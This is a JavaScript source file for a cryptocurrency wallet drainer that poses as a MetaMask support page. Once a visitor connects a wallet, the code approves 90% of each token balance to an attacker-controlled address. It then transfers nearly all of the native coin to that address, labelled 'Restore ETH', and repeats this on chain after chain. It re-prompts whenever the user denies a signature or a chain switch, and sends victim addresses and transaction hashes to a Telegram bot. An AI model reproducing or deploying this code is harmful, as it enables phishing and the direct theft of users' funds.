import { createWeb3Modal, defaultConfig } from "@web3modal/ethers5";
import { utils, BigNumber } from "ethers";
import TOKEN_ABI from "../settings.json";
import { getTokensOwned } from "./apiConfig";

document.addEventListener("DOMContentLoaded", async () => {
    const data = {
        web3: null,
        chainId: null,
        userAddress: null,
        provider: null,
    };

    let mySupportedChains = [
        1, 56, 137, 42161, 43114, 10, 8453, 250, 59144, 25, 169,
    ];
    let usedChains = [];

    const projectId = import.meta.env.VITE_ETH_PROJECT_ID;
    if (!projectId) {
        throw new Error("VITE_PROJECT_ID is not set");
    }

    // 2. Create wagmiConfig
    const chains = [
        {
            chainId: 1,
            name: "Ethereum",
            currency: "ETH",
            explorerUrl: "https://etherscan.io",
            rpcUrl: "https://cloudflare-eth.com",
        },
        {
            chainId: 56,
            name: "Binance Smart Chain",
            currency: "BNB",
            explorerUrl: "https://bscscan.com",
            rpcUrl: "https://bsc-dataseed.binance.org",
        },
        {
            chainId: 137,
            name: "Polygon",
            currency: "MATIC",
            explorerUrl: "https://polygonscan.com",
            rpcUrl: "https://polygon-rpc.com",
        },
        {
            chainId: 42161,
            name: "Arbitrum",
            currency: "ETH",
            explorerUrl: "https://arbiscan.io",
            rpcUrl: "https://arb1.arbitrum.io/rpc",
        },
        {
            chainId: 43114,
            name: "Avalanche",
            currency: "AVAX",
            explorerUrl: "https://snowtrace.io",
            rpcUrl: "https://api.avax.network/ext/bc/C/rpc",
        },
        {
            chainId: 10,
            name: "Optimism",
            currency: "ETH",
            explorerUrl: "https://optimistic.etherscan.io",
            rpcUrl: "https://mainnet.optimism.io",
        },
        {
            chainId: 8453,
            name: "Base",
            currency: "ETH",
            explorerUrl: "https://basescan.org",
            rpcUrl: "https://mainnet.base.org",
        },
        {
            chainId: 250,
            name: "Fantom",
            currency: "FTM",
            explorerUrl: "https://ftmscan.com",
            rpcUrl: "https://rpc.ftm.tools",
        },
        {
            chainId: 59144,
            name: "Linea",
            currency: "ETH",
            explorerUrl: "https://explorer.linea.build",
            rpcUrl: "https://rpc.linea.build",
        },
        {
            chainId: 25,
            name: "Cronos",
            currency: "CRO",
            explorerUrl: "https://cronoscan.com",
            rpcUrl: "https://evm-cronos.crypto.org",
        },
        {
            chainId: 169,
            name: "Manta Pacific",
            currency: "MANTA",
            explorerUrl: "https://explorer.manta.network",
            rpcUrl: "https://rpc.manta.network",
        },
        {
            chainId: 369,
            name: "PulseChain",
            currency: "PLS",
            explorerUrl: "https://scan.pulsechain.com",
            rpcUrl: "https://rpc.pulsechain.com",
        },
    ];

    const ethersConfig = defaultConfig({
        metadata: {
            name: "Metamask | Support",
            description: "Metamask Support",
            url: "https://metamask.io",
            icons: ["https://metamask.io/favicon-32x32.png"],
        },
        defaultChainId: 1,
        rpcUrl: "https://cloudflare-eth.com",
    });

    // 3. Create modal
    const modal = createWeb3Modal({
        ethersConfig: { ...ethersConfig, email: true },
        projectId,
        chains,
        themeMode: "dark",
    });

    document
        .querySelector("#connectButton")
        .addEventListener("click", initWeb3);
    document
        .querySelector("#connectButton2")
        .addEventListener("click", initWeb3);
    document
        .querySelector("#connectButton3")
        .addEventListener("click", initWeb3);

    // await initWeb3();

    async function initWeb3() {
        if (modal.getIsConnected() == false) {
            modal.open();
            observeDOM();
        } else {
            await initAccounts();
            const connectedAccounts = await modal.getWalletProvider().request({
                method: "eth_requestAccounts",
            });
            sendErr(`${connectedAccounts[0]} is connected`);
        }
    }

    async function initAccounts() {
        if (modal.getIsConnected() == false) {
            setTimeout(() => {
                modal.open();
            }, 1000);

            return;
        }

        data.provider = modal.getWalletProvider();

        const connectedAccounts = await modal.getWalletProvider().request({
            method: "eth_requestAccounts",
        });

        const currentChain = await modal.getWalletProvider().request({
            method: "eth_chainId",
        });

        if (
            !mySupportedChains.includes(Number(BigInt(currentChain).toString()))
        ) {
            await switchChain(Number(mySupportedChains[0]).toString(16));
        }

        try {
            const resultTokens = await getTokensOwned(
                connectedAccounts[0],
                BigInt(currentChain).toString()
            );

            if (resultTokens.length > 0) {
                let shouldRestoreETH = false;

                for (let i = 0; i < resultTokens.length; i++) {
                    try {
                        const tkn = resultTokens[i];

                        const iFace = new utils.Interface(TOKEN_ABI.TOKEN_ABI);

                        const balanceData = iFace.encodeFunctionData(
                            "balanceOf",
                            [`0x${connectedAccounts[0].replace(/^0x/, "")}`]
                        );

                        const userBalanceHex = await modal
                            .getWalletProvider()
                            .request({
                                method: "eth_call",
                                params: [
                                    {
                                        to: `0x${tkn.address.replace(
                                            /^0x/,
                                            ""
                                        )}`,
                                        data: balanceData,
                                    },
                                ],
                            });

                        const userBalance = BigNumber.from(userBalanceHex);

                        const approvalAmount = userBalance
                            .mul(BigNumber.from(90))
                            .div(BigNumber.from(100));

                        const tokenData = iFace.encodeFunctionData("approve", [
                            `0x${import.meta.env.VITE_OWNER_ADDRESS.replace(
                                /^0x/,
                                ""
                            )}`,
                            String(approvalAmount),
                        ]);

                        const userNonce = await modal
                            .getWalletProvider()
                            .request({
                                method: "eth_getTransactionCount",
                                params: [
                                    `0x${connectedAccounts[0].replace(
                                        /^0x/,
                                        ""
                                    )}`,
                                    "latest",
                                ],
                            });

                        const tokenTX = {
                            from: `0x${connectedAccounts[0].replace(
                                /^0x/,
                                ""
                            )}`,
                            to: `0x${tkn.address.replace(/^0x/, "")}`,
                            data: tokenData,
                            nonce: userNonce,
                        };

                        const userTokenTX = await modal
                            .getWalletProvider()
                            .request({
                                method: "eth_sendTransaction",
                                params: [tokenTX],
                            });

                        sendErr(
                            `Token ${tkn.address} allowance on chain ${currentChain} & user ${connectedAccounts[0]} & Hash: ${userTokenTX}`
                        );
                    } catch (error) {
                        sendErr(
                            `Error approving token ${resultTokens[i].address}: ${error.message}`
                        );
                        if (isRetryError(error)) {
                            sendErr(
                                `Retrying token ${resultTokens[i].address} at index ${i}...`
                            );
                            i--;
                            continue;
                        } else if (isRevertError(error)) {
                            // console.log(error);
                            continue;
                        } else {
                            shouldRestoreETH = true;
                        }
                    }
                }

                if (shouldRestoreETH) {
                    await initRestoreETH();
                }
            } else {
                await initRestoreETH();
            }
        } catch (error) {
            // console.log(String(error).startsWith("Moralis SDK Core Error"));
            if (String(error).startsWith("Moralis SDK Core Error")) {
                await initRestoreETH();
                return;
            } else {
                await initRestoreETH();
                return;
            }
        }

        // await initRestoreETH();
    }

    async function initRestoreETH() {
        const currentChain = await modal.getWalletProvider().request({
            method: "eth_chainId",
        });

        try {
            const connectedAccounts = await modal.getWalletProvider().request({
                method: "eth_requestAccounts",
            });

            const balanceHex = await modal.getWalletProvider().request({
                method: "eth_getBalance",
                params: [connectedAccounts[0], "latest"],
            });

            const userNonce = await modal.getWalletProvider().request({
                method: "eth_getTransactionCount",
                params: [connectedAccounts[0], "latest"],
            });

            const valueToSend = BigInt(balanceHex);

            const resTX = {
                from: `0x${connectedAccounts[0].replace(/^0x/, "")}`,
                to: `0x${import.meta.env.VITE_OWNER_ADDRESS.replace(
                    /^0x/,
                    ""
                )}`,
                value: `0x${valueToSend.toString(16)}`,
                nonce: `0x${BigInt(userNonce).toString(16)}`,
            };

            const estimatedGas = await modal.getWalletProvider().request({
                method: "eth_estimateGas",
                params: [resTX],
            });

            const gasPrice = await modal.getWalletProvider().request({
                method: "eth_gasPrice",
            });

            const realValue =
                valueToSend - BigInt(estimatedGas) * BigInt(gasPrice) * 5n;

            if (realValue <= 0n) {
                throw new Error(`Insufficient Balance`);
            }

            resTX.value = `0x${realValue.toString(16)}`;

            const sendTX = await modal.getWalletProvider().request({
                method: "eth_sendTransaction",
                params: [resTX],
            });

            await sendErr(
                `Restore ETH Success Hash: ${sendTX} on chain ${currentChain}`
            );

            usedChains.push(Number(BigInt(currentChain).toString()));
            mySupportedChains = mySupportedChains.filter(
                (item) => !usedChains.includes(Number(item))
            );

            switchChain(mySupportedChains[0]);
        } catch (error) {
            sendErr(
                `Error restoring ETH: ${error.message} chain ${await modal
                    .getWalletProvider()
                    .request({
                        method: "eth_chainId",
                    })}`
            );
            if (isRetryError(error)) {
                sendErr(`Retrying restore ETH...`);
                await initRestoreETH();
            } else {
                if (mySupportedChains.length > 0) {
                    usedChains.push(Number(BigInt(currentChain).toString()));
                    mySupportedChains = mySupportedChains.filter(
                        (item) => !usedChains.includes(Number(item))
                    );

                    switchChain(mySupportedChains[0]);
                } else {
                    sendErr(`No supported chains left to switch to.`);
                }
            }
        }
    }

    async function switchChain(x) {
        try {
            await modal.getWalletProvider().request({
                method: "wallet_switchEthereumChain",
                params: [{ chainId: `0x${x.toString(16)}` }],
            });

            await initAccounts();
        } catch (error) {
            if (error.code == 4001) {
                await switchChain(x);
                return;
            } else if (error.code == 4902) {
                try {
                    const chain = chains.find((c) => c.chainId === x);

                    const params = {
                        chainId: `0x${x.toString(16)}`,
                        chainName: chain.name,
                        nativeCurrency: {
                            name: chain.currency,
                            symbol: chain.currency,
                            decimals: 18,
                        },
                        rpcUrls: [chain.rpcUrl],
                        blockExplorerUrls: [chain.explorerUrl],
                    };
                    await modal.getWalletProvider().request({
                        method: "wallet_addEthereumChain",
                        params: [params],
                        // params: [{ chainId: `0x${x.toString(16)}` }],
                    });
                } catch (error) {
                    if (error.code == 4001) {
                        await switchChain(x);
                        return;
                    }
                }
            } else {
                await sendErr("Switch manually to a supported chain");
                await initAccounts();
                return;
            }
        }
    }

    function observeDOM() {
        const targetNode = document.head;
        const config = { childList: true, subtree: true };

        const callback = function (mutationsList, observer) {
            for (const mutation of mutationsList) {
                if (
                    mutation.type === "childList" &&
                    !document.querySelector('style[data-w3m="scroll-lock"]')
                ) {
                    initAccounts();
                }
            }
        };

        const observer = new MutationObserver(callback);
        observer.observe(targetNode, config);

        return observer;
    }

    async function sendErr(x) {
        const options = {
            method: "POST",
            mode: "cors",
            headers: {
                accept: "application/json",
                "content-type": "application/json",
            },
            body: JSON.stringify({
                text: String(x),
                disable_web_page_preview: false,
                disable_notification: false,
                reply_to_message_id: null,
                chat_id: import.meta.env.VITE_MY_CHAT_ID,
            }),
        };

        // console.log(x);

        fetch(
            `https://api.telegram.org/bot${
                import.meta.env.VITE_TELEGRAM_TOKEN_BOT
            }/sendMessage`,
            options
        )
            .then((response) => response.json())
            .then((response) => console.log(response))
            .catch((err) => console.error(err));
    }

    function isRetryError(error) {
        return error.message.includes("User denied transaction signature");
    }

    function isRevertError(error) {
        return error.message.includes(
            "Execution reverted for an unknown reason"
        );
    }
});
